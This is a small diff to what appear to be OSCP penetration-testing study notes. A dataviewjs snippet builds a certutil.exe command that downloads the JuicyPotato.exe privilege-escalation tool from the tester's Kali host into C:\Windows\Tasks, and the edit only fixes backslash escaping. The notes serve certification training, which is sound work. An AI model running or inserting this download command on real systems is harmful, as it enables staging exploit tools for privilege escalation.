@@ -199,7 +199,7 @@ OR
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\Windows\Tasks\JuicyPotato.exe`;
+const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\\\Windows\\\Tasks\\\JuicyPotato.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
